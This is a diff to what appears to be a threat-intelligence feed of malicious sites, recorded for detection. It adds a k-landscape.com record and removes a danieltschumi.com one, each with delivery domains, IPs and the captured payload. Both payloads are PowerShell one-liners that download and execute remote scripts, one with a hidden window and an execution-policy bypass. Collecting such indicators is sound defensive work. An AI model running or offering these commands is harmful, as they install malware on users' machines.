@@ -1,5 +1,32 @@
 [
   {
+    "UrlDomain": "k-landscape.com",
+    "DeliveryUrl": [
+      "cdn-speed.beer",
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.68.16.45"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/241f82e9da7d4c6c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=d1073f38e4c5855f8435c46194f7b1ad74b4065b42fb02cb&amp;_v=29920496",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/241f82e9da7d4c6c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/241f82e9da7d4c6c"
+    ],
+    "ReportId": "cmwpthx4023zn0omleyj7lhjr",
+    "ScannedAt": "2026-11-21T02:57:24.007000+00:00"
+  },
+  {
     "UrlDomain": "rsventure.in",
     "DeliveryUrl": [
       "makeverizyjar.info",
@@ -941,24 +968,5 @@
     ],
     "ReportId": "cmwohx2dv1zej0oml7l27yiez",
     "ScannedAt": "2026-11-20T04:45:29.109000+00:00"
-  },
-  {
-    "UrlDomain": "danieltschumi.com",
-    "DeliveryUrl": [
-      "simpludelicios.md"
-    ],
-    "PayloadUrl": [
-      "https://simpludelicios.md/vcapcha.ps1"
-    ],
-    "IP": [
-      "149.126.4.94"
-    ],
-    "Related": [],
-    "Payload": "powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString('https://simpludelicios[.]md/vcapcha.ps1'))\"",
-    "ResolvedDownloadUrl": [
-      "https://simpludelicios.md/vcapcha.ps1"
-    ],
-    "ReportId": "cmwoed01h1z340oml4kvksqv8",
-    "ScannedAt": "2026-11-20T03:05:54.133000+00:00"
   }
 ]
